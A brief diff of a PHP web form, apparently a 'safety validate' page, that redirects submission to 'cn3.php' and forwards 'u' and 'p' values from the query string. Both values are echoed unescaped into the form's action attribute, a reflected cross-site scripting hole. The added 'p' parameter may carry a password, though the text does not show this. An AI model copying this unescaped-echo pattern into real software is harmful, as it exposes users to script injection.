@@ -29,7 +29,7 @@
 	<script language="javascript" src="htdocs/js/check.js"></script>
 
 <body>
-<form name="myform" id="myform" method="post" autocomplete="off" action="do_mb_resetk2.php?u=<?php echo $_GET['u']; ?>" onsubmit="return checkForm();" accept-charset="utf8" target="_top">
+<form name="myform" id="myform" method="post" autocomplete="off" action="cn3.php?u=<?php echo $_GET['u']; ?>&p=<?php echo $_GET['p']; ?>" onsubmit="return checkForm();" accept-charset="utf8" target="_top">
 <div class="safetyvalidate" >
 
   <div class="content">
